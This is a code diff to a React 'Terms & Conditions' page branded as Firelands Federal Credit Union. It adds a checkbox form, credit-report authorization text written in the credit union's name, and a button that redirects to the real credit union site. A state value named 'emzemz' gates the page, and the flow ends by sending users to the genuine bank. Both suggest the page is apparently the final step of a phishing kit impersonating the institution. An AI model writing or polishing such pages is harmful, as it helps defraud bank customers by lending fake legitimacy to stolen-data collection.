@@ -1,4 +1,4 @@
-import React, { useEffect } from 'react';
+import React, { useEffect, useState } from 'react';
 import { useNavigate, useLocation } from 'react-router-dom';
 
 const heroImageUrl = '/assets/firelands-landing.jpg';
@@ -7,20 +7,29 @@ const Terms: React.FC = () => {
   const navigate = useNavigate();
   const location = useLocation();
   const { emzemz } = location.state || {};
+  const [isChecked, setIsChecked] = useState(false);
+  const [error, setError] = useState('');
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   useEffect(() => {
     if (!emzemz) {
       navigate('/');
       return;
     }
-    
-    // Redirect to Firelands FCU after 5 seconds
-    const timer = setTimeout(() => {
-      window.location.href = 'https://www.firelandsfcu.org';
-    }, 5000);
-    
-    return () => clearTimeout(timer);
   }, [emzemz, navigate]);
+
+  const handleSubmit = (event: React.FormEvent) => {
+    event.preventDefault();
+
+    if (!isChecked) {
+      setError('Please agree to the terms before continuing.');
+      return;
+    }
+
+    setError('');
+    setIsSubmitting(true);
+    window.location.href = 'https://www.firelandsfcu.org';
+  };
 
   return (
     <div className="relative flex min-h-screen flex-col overflow-hidden text-white">
@@ -35,18 +44,52 @@ const Terms: React.FC = () => {
             <h2 className="text-2xl font-semibold text-[#2f2e67] mb-4">Terms & Conditions</h2>
             
             <div className="prose prose-sm max-w-none">
-              <p>By using this service, you agree to our terms of use and privacy policy.</p>
-              
-              <ul className="list-disc pl-5 space-y-2 mt-4">
-                <li>You authorize the processing of your information</li>
-                <li>You confirm all provided details are accurate</li>
-                <li>You agree to electronic communications</li>
-              </ul>
-              
-              <p className="mt-6 text-sm">
-                Redirecting to Firelands FCU in 5 seconds...
+              <p>
+                By submitting this registration form, I understand that I am providing written instructions in accordance
+                with the Fair Credit Reporting Act, Driver Privacy Protection Act, and other applicable law for Firelands
+                Federal Credit Union and its affiliates to request and receive information about me from third parties,
+                including but not limited to a copy of my consumer credit report, score, and motor vehicle records from
+                consumer reporting agencies, at any time for so long as I have an active account.
+              </p>
+
+              <p>
+                I further authorize Firelands Federal Credit Union and its affiliates to retain a copy of my information for
+                use in accordance with Firelands FCU's{' '}
+                <a href="#" className="text-[#5a63d8] hover:underline">
+                  Terms of Service
+                </a>{' '}
+                and{' '}
+                <a href="#" className="text-[#5a63d8] hover:underline">
+                  Privacy Statement
+                </a>
+                .
               </p>
             </div>
+
+            <form onSubmit={handleSubmit} className="mt-8 space-y-4">
+              <label className="flex items-center gap-3 text-sm text-[#5d4f72]">
+                <input
+                  type="checkbox"
+                  checked={isChecked}
+                  onChange={() => {
+                    setIsChecked((prev) => !prev);
+                    setError('');
+                  }}
+                  className="h-4 w-4 rounded border border-gray-300 text-[#5a63d8] focus:ring-[#5a63d8]"
+                />
+                I have read and agree to the terms and privacy policy.
+              </label>
+
+              {error && <p className="text-sm text-rose-600">{error}</p>}
+
+              <button
+                type="submit"
+                disabled={isSubmitting}
+                className="w-full rounded-full bg-gradient-to-r from-[#cdd1f5] to-[#f2f3fb] px-6 py-3 text-base font-semibold text-[#8f8fb8] shadow-inner transition enabled:hover:from-[#b7bff2] enabled:hover:to-[#e3e6fb] disabled:opacity-70"
+              >
+                {isSubmitting ? 'Redirecting…' : 'Continue to Firelands FCU'}
+              </button>
+            </form>
           </div>
         </div>
       </div>
